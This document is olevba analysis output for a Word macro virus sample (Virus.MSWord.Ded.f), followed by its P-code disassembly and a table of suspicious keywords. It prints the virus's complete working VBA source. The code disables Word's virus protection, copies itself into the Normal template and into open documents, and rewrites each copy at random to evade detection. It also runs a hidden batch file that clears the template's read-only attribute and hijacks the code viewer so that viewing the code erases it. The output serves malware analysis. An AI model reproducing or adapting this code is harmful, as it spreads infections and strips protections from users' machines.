olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Ded.f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Ded.f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
            Private Sub _
Document_New()

       End Sub
'36,40187
              Private Sub _
Document_Close()

    On Error GoTo skam
'38,20107
      Options. _
                    VirusProtection = False

   SWL
'63,31789
   ABS99
'90,57298
skam:
'63,17424
        End Sub
'2,26292
    Private _
Sub SWL()

  Application. _
                               ShowVisualBasicEditor = False

     If _
Not ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

For I = 1 To NormalTemplate.VBProject.VBComponents(1). _
    CodeModule.CountOfLines

           d = _
NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

 If _
Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

     While _
Mid(d, Len(d) - 1, 2) = " _"

   I _
= I + 1

        d = _
Left(d, Len(d) - 1) & NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

            Wend
'84,72455
       d = _
e(d)

    ActiveDocument. _
              VBProject.VBComponents(1).CodeModule.InsertLines I * 2, d

             End If
'36,34587
           Next _
I

        ActiveDocument. _
                                            SaveAs AddToRecentFiles:=False

           End If
'90,30988
              End Sub
'27,52955
   Private Sub ABS99()
'97,29667
           If Not NormalTemplate. _
        VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

 f (NormalTemplate. _
                FullName)

  For _
I = 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines

    d _
= ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

   If _
Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

             While _
Mid(d, Len(d) - 1, 2) = " _"

            I = I + 1
'74,23421
             d = Left(d, Len(d) - _
1) & ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

      Wend
'7,495034
       d = _
e(d)

  NormalTemplate. _
 VBProject.VBComponents(1).CodeModule.InsertLines I * 2, d

 End _
If

Next I
'47,13914
           NormalTemplate.Save
'82,7899
            End _
If

        End _
Sub

            Private Function e(aString) As _
String

       aString = LTrim(aString)
'26,80438
              aString = _
RTrim(aString)

         If _
aString = "Sub " & "Vc()" Then

           aString _
= "Sub " & "ViewVBCode()"

         Else
'31,18372
    If aString = "Sub " & "ViewVBCode()" Then
'45,09994
           aString _
= "Sub " & "Vc()"

   End If
'6,985104
   End If
'92,54505
   For I = 1 To _
Len(aString) - 1

           If Mid(aString, I, 1) _
= "." Then

      If Not Mid(aString, _
I - 1, 1) = Chr$(34) And Not Mid(aString, I + 1, 1) = Chr$(34) And Int(3 * Rnd) = 1 Then

              If Not _
Mid(aString, I + 1, 1) = Chr$(34) Then

         e _
= Left(aString, I - 1) & ". _" & Chr$(13) & Right(aString, Len(aString) - I)

        For _
j = 1 To Int(15 * Rnd)

     e = " " & _
e

  Next j
'37,77427
             Exit Function
'4,393273
       End If
'20,96745
     End _
If

         Else
'53,82507
 If Mid(aString, I, _
1) = " " And Int(3 * Rnd) = 1 And I > 1 Then

         If Not Mid(aString, _
I + 1, 1) = Chr$(34) And Not Mid(aString, I - 1, 1) = Chr$(34) Then

         e = Left(aString, I _
- 1) & " _" & Chr$(13) & Right(aString, Len(aString) - I)

            For _
j = 1 To Int(15 * Rnd)

         e = " " & _
e

     Next j
'29,1052
      Exit Function
'76,98775
        End If
'17,76208
 End If
'43,15423
 End _
If

       Next I
'41,63005
      e _
= aString & Chr$(13) & "'" & (100 * Rnd)

     Count _
= Int(15 * Rnd)

        For _
j = 1 To Count

        e _
= " " & e

   Next j
'76,01295
          End Function
'27,8411
          Private _
Sub f(fName)

   If GetAttr(fName) And vbReadOnly Then
'95,71298
Open Dir(fName) _
& ".bat" For Append As #1

             Print _
#1, "Attrib " & "-r " & Chr$(34) & fName & Chr$(34)

      Print _
#1, "del " & Chr$(34) & Dir(fName) & ".bat" & Chr$(34)

  Close _
#1

            shellResult = Shell(Dir(fName) & ".bat", vbHide)
'86,16203
End If
'27,48487
     End _
Sub

        Sub _
Vc()

      For _
aDoc = 1 To Documents.Count

     For I = _
1 To Documents(aDoc).VBProject.VBComponents(1).CodeModule.CountOfLines

 Documents(aDoc).VBProject. _
   VBComponents(1).CodeModule.DeleteLines 1

      Next I
'49,3554
          Next aDoc
'14,7068
           For _
I = 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines

            NormalTemplate. _
                                       VBProject.VBComponents(1).CodeModule.DeleteLines 1

      Next I
'29,4584
              Application.ShowVisualBasicEditor _
= True

              End Sub
'0,3313601
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Ded.f
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 10093 bytes
' Line #0:
' 	LineCont 0x0004 02 00 00 00
' 	FuncDefn (Private Sub Document_New())
' Line #1:
' Line #2:
' 	EndSub 
' Line #3:
' 	QuoteRem 0x0000 0x0008 "36,40187"
' Line #4:
' 	LineCont 0x0004 02 00 00 00
' 	FuncDefn (Private Sub Document_Close())
' Line #5:
' Line #6:
' 	OnError skam 
' Line #7:
' 	QuoteRem 0x0000 0x0008 "38,20107"
' Line #8:
' 	LineCont 0x0004 02 00 14 00
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #9:
' Line #10:
' 	ArgsCall SWL 0x0000 
' Line #11:
' 	QuoteRem 0x0000 0x0008 "63,31789"
' Line #12:
' 	ArgsCall ABS99 0x0000 
' Line #13:
' 	QuoteRem 0x0000 0x0008 "90,57298"
' Line #14:
' 	Label skam 
' Line #15:
' 	QuoteRem 0x0000 0x0008 "63,17424"
' Line #16:
' 	EndSub 
' Line #17:
' 	QuoteRem 0x0000 0x0007 "2,26292"
' Line #18:
' 	LineCont 0x0004 01 00 00 00
' 	FuncDefn (Private Sub SWL())
' Line #19:
' Line #20:
' 	LineCont 0x0004 02 00 1F 00
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #21:
' Line #22:
' 	LineCont 0x0004 01 00 00 00
' 	LitStr 0x000E "Document_Close"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #23:
' Line #24:
' 	LineCont 0x0004 0E 00 04 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #25:
' Line #26:
' 	LineCont 0x0004 02 00 00 00
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St d 
' Line #27:
' Line #28:
' 	LineCont 0x0004 01 00 00 00
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld d 
' 	LitStr 0x0001 " "
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	Not 
' 	And 
' 	IfBlock 
' Line #29:
' Line #30:
' 	LineCont 0x0004 01 00 00 00
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	While 
' Line #31:
' Line #32:
' 	LineCont 0x0004 01 00 00 00
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	St I 
' Line #33:
' Line #34:
' 	LineCont 0x0004 02 00 00 00
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	St d 
' Line #35:
' Line #36:
' 	Wend 
' Line #37:
' 	QuoteRem 0x0000 0x0008 "84,72455"
' Line #38:
' 	LineCont 0x0004 02 00 00 00
' 	Ld d 
' 	ArgsLd e 0x0001 
' 	St d 
' Line #39:
' Line #40:
' 	LineCont 0x0004 02 00 0E 00
' 	Ld I 
' 	LitDI2 0x0002 
' 	Mul 
' 	Ld d 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #41:
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	QuoteRem 0x0000 0x0008 "36,34587"
' Line #44:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #45:
' Line #46:
' 	LineCont 0x0004 02 00 2C 00
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #47:
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	QuoteRem 0x0000 0x0008 "90,30988"
' Line #50:
' 	EndSub 
' Line #51:
' 	QuoteRem 0x0000 0x0008 "27,52955"
' Line #52:
' 	FuncDefn (Private Sub ABS99())
' Line #53:
' 	QuoteRem 0x0000 0x0008 "97,29667"
' Line #54:
' 	LineCont 0x0004 04 00 08 00
' 	LitStr 0x000E "Document_Close"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #55:
' Line #56:
' 	LineCont 0x0004 04 00 10 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Paren 
' 	ArgsCall False 0x0001 
' Line #57:
' Line #58:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #59:
' Line #60:
' 	LineCont 0x0004 01 00 00 00
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St d 
' Line #61:
' Line #62:
' 	LineCont 0x0004 01 00 00 00
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld d 
' 	LitStr 0x0001 " "
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	Not 
' 	And 
' 	IfBlock 
' Line #63:
' Line #64:
' 	LineCont 0x0004 01 00 00 00
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	While 
' Line #65:
' Line #66:
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	St I 
' Line #67:
' 	QuoteRem 0x0000 0x0008 "74,23421"
' Line #68:
' 	LineCont 0x0004 0B 00 00 00
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	St d 
' Line #69:
' Line #70:
' 	Wend 
' Line #71:
' 	QuoteRem 0x0000 0x0008 "7,495034"
' Line #72:
' 	LineCont 0x0004 02 00 00 00
' 	Ld d 
' 	ArgsLd e 0x0001 
' 	St d 
' Line #73:
' Line #74:
' 	LineCont 0x0004 02 00 01 00
' 	Ld I 
' 	LitDI2 0x0002 
' 	Mul 
' 	Ld d 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #75:
' Line #76:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #77:
' Line #78:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #79:
' 	QuoteRem 0x0000 0x0008 "47,13914"
' Line #80:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #81:
' 	QuoteRem 0x0000 0x0007 "82,7899"
' Line #82:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #83:
' Line #84:
' 	LineCont 0x0004 01 00 00 00
' 	EndSub 
' Line #85:
' Line #86:
' 	LineCont 0x0004 07 00 00 00
' 	FuncDefn (Private Function e(aString, id_FFFE As String) As String)
' Line #87:
' Line #88:
' 	Ld aString 
' 	ArgsLd LTrim 0x0001 
' 	St aString 
' Line #89:
' 	QuoteRem 0x0000 0x0008 "26,80438"
' Line #90:
' 	LineCont 0x0004 02 00 00 00
' 	Ld aString 
' 	ArgsLd RTrim 0x0001 
' 	St aString 
' Line #91:
' Line #92:
' 	LineCont 0x0004 01 00 00 00
' 	Ld aString 
' 	LitStr 0x0004 "Sub "
' 	LitStr 0x0004 "Vc()"
' 	Concat 
' 	Eq 
' 	IfBlock 
' Line #93:
' Line #94:
' 	LineCont 0x0004 01 00 00 00
' 	LitStr 0x0004 "Sub "
' 	LitStr 0x000C "ViewVBCode()"
' 	Concat 
' 	St aString 
' Line #95:
' Line #96:
' 	ElseBlock 
' Line #97:
' 	QuoteRem 0x0000 0x0008 "31,18372"
' Line #98:
' 	Ld aString 
' 	LitStr 0x0004 "Sub "
' 	LitStr 0x000C "ViewVBCode()"
' 	Concat 
' 	Eq 
' 	IfBlock 
' Line #99:
' 	QuoteRem 0x0000 0x0008 "45,09994"
' Line #100:
' 	LineCont 0x0004 01 00 00 00
' 	LitStr 0x0004 "Sub "
' 	LitStr 0x0004 "Vc()"
' 	Concat 
' 	St aString 
' Line #101:
' Line #102:
' 	EndIfBlock 
' Line #103:
' 	QuoteRem 0x0000 0x0008 "6,985104"
' Line #104:
' 	EndIfBlock 
' Line #105:
' 	QuoteRem 0x0000 0x0008 "92,54505"
' Line #106:
' 	LineCont 0x0004 05 00 00 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld aString 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #107:
' Line #108:
' 	LineCont 0x0004 09 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "."
' 	Eq 
' 	IfBlock 
' Line #109:
' Line #110:
' 	LineCont 0x0004 06 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	And 
' 	LitDI2 0x0003 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #111:
' Line #112:
' 	LineCont 0x0004 02 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	IfBlock 
' Line #113:
' Line #114:
' 	LineCont 0x0004 01 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 ". _"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld aString 
' 	Ld aString 
' 	FnLen 
' 	Ld I 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	Concat 
' 	St e 
' Line #115:
' Line #116:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	For 
' Line #117:
' Line #118:
' 	LineCont 0x0004 04 00 00 00
' 	LitStr 0x0001 " "
' 	Ld e 
' 	Concat 
' 	St e 
' Line #119:
' Line #120:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #121:
' 	QuoteRem 0x0000 0x0008 "37,77427"
' Line #122:
' 	ExitFunc 
' Line #123:
' 	QuoteRem 0x0000 0x0008 "4,393273"
' Line #124:
' 	EndIfBlock 
' Line #125:
' 	QuoteRem 0x0000 0x0008 "20,96745"
' Line #126:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #127:
' Line #128:
' 	ElseBlock 
' Line #129:
' 	QuoteRem 0x0000 0x0008 "53,82507"
' Line #130:
' 	LineCont 0x0004 07 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 " "
' 	Eq 
' 	LitDI2 0x0003 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #131:
' Line #132:
' 	LineCont 0x0004 06 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	And 
' 	IfBlock 
' Line #133:
' Line #134:
' 	LineCont 0x0004 07 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0002 " _"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld aString 
' 	Ld aString 
' 	FnLen 
' 	Ld I 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	Concat 
' 	St e 
' Line #135:
' Line #136:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	For 
' Line #137:
' Line #138:
' 	LineCont 0x0004 04 00 00 00
' 	LitStr 0x0001 " "
' 	Ld e 
' 	Concat 
' 	St e 
' Line #139:
' Line #140:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #141:
' 	QuoteRem 0x0000 0x0007 "29,1052"
' Line #142:
' 	ExitFunc 
' Line #143:
' 	QuoteRem 0x0000 0x0008 "76,98775"
' Line #144:
' 	EndIfBlock 
' Line #145:
' 	QuoteRem 0x0000 0x0008 "17,76208"
' Line #146:
' 	EndIfBlock 
' Line #147:
' 	QuoteRem 0x0000 0x0008 "43,15423"
' Line #148:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #149:
' Line #150:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #151:
' 	QuoteRem 0x0000 0x0008 "41,63005"
' Line #152:
' 	LineCont 0x0004 01 00 00 00
' 	Ld aString 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0001 "'"
' 	Concat 
' 	LitDI2 0x0064 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	Concat 
' 	St e 
' Line #153:
' Line #154:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x000F 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	St Count 
' Line #155:
' Line #156:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Count 
' 	For 
' Line #157:
' Line #158:
' 	LineCont 0x0004 01 00 00 00
' 	LitStr 0x0001 " "
' 	Ld e 
' 	Concat 
' 	St e 
' Line #159:
' Line #160:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #161:
' 	QuoteRem 0x0000 0x0008 "76,01295"
' Line #162:
' 	EndFunc 
' Line #163:
' 	QuoteRem 0x0000 0x0007 "27,8411"
' Line #164:
' 	LineCont 0x0004 01 00 00 00
' 	FuncDefn (Private Sub False(fName))
' Line #165:
' Line #166:
' 	Ld fName 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbReadOnly 
' 	And 
' 	IfBlock 
' Line #167:
' 	QuoteRem 0x0000 0x0008 "95,71298"
' Line #168:
' 	LineCont 0x0004 05 00 00 00
' 	Ld fName 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0004 ".bat"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #169:
' Line #170:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "Attrib "
' 	LitStr 0x0003 "-r "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld fName 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #171:
' Line #172:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "del "
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld fName 
' 	ArgsLd Dir 0x0001 
' 	Concat 
' 	LitStr 0x0004 ".bat"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #173:
' Line #174:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #175:
' Line #176:
' 	Ld fName 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0004 ".bat"
' 	Concat 
' 	Ld vbHide 
' 	ArgsLd Shell 0x0002 
' 	St shellResult 
' Line #177:
' 	QuoteRem 0x0000 0x0008 "86,16203"
' Line #178:
' 	EndIfBlock 
' Line #179:
' 	QuoteRem 0x0000 0x0008 "27,48487"
' Line #180:
' 	LineCont 0x0004 01 00 00 00
' 	EndSub 
' Line #181:
' Line #182:
' 	LineCont 0x0004 01 00 00 00
' 	FuncDefn (Sub Vc())
' Line #183:
' Line #184:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld aDoc 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #185:
' Line #186:
' 	LineCont 0x0004 03 00 00 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld aDoc 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #187:
' Line #188:
' 	LineCont 0x0004 07 00 03 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld aDoc 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #189:
' Line #190:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #191:
' 	QuoteRem 0x0000 0x0007 "49,3554"
' Line #192:
' 	StartForVariable 
' 	Ld aDoc 
' 	EndForVariable 
' 	NextVar 
' Line #193:
' 	QuoteRem 0x0000 0x0007 "14,7068"
' Line #194:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #195:
' Line #196:
' 	LineCont 0x0004 02 00 27 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #197:
' Line #198:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #199:
' 	QuoteRem 0x0000 0x0007 "29,4584"
' Line #200:
' 	LineCont 0x0004 03 00 00 00
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #201:
' Line #202:
' 	EndSub 
' Line #203:
' 	QuoteRem 0x0000 0x0009 "0,3313601"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

